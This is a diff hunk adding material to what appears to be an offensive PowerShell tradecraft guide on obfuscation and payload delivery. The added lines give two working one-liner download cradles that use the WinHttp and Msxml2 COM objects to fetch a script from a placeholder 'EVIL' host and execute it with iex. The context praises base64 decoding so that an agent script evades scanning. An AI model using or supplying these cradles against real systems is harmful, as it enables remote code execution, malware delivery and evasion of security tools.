@@ -901,6 +901,15 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
+      The follow oneliner's are also downloaders using diferent COM objects like 'WinHttp' or 'Msxml2'
+
+<br />
+
+`$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText`
+`$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText`
+
+---
+
       Using base64 stings decoded at runtime are a Useful obfuscation trick, because
       the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 
 
